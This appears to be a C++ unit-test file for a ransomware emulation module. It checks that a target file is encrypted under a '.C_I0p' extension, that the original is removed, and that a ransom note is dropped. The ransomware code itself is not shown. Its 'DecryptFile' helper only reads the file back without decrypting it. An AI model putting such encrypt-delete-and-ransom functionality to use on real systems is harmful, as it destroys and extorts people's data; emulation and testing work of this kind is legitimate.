#include <filesystem>
#include <gtest/gtest.h>
#include <iostream>
#include <fstream>

#include "encryption.hpp"


std::string DUMMYSTR = "Foo Bar";
const char* FILENAME = "Test_File.txt";
const char* ENCRYPTED_FILENAME = "Test_File.txt.C_I0p";


std::string DecryptFile(std::string filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        XorLogger::LogError(std::format("Problem loading {}", filePath));
        return "";
    }
    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string decrypted = buffer.str();

    return decrypted;
}


class EncryptFileTest : public ::testing::Test {
protected:

    virtual void SetUp() {
        std::ofstream testfile;
        testfile.open(FILENAME);
        testfile << DUMMYSTR;
        testfile.close();
    }

    virtual void TearDown() {
        std::filesystem::remove(std::string(ENCRYPTED_FILENAME));
        std::filesystem::remove(std::string(NOTE_FILENAME));
    }
};


TEST_F(EncryptFileTest, TestFileEncryptRoundTrip) {
    EXPECT_TRUE(Encryption::EncryptFile(FILENAME));

    std::string decrypted = DecryptFile(std::string(FILENAME).append(FILE_EXT));
    EXPECT_EQ(DUMMYSTR, decrypted);
}

TEST_F(EncryptFileTest, TestRansomNoteDrop) {
    EXPECT_TRUE(Encryption::PerformImpact(FILENAME));

    EXPECT_FALSE(std::filesystem::exists(FILENAME));
    EXPECT_TRUE(std::filesystem::exists(ENCRYPTED_FILENAME));
    EXPECT_TRUE(std::filesystem::exists(NOTE_FILENAME));
}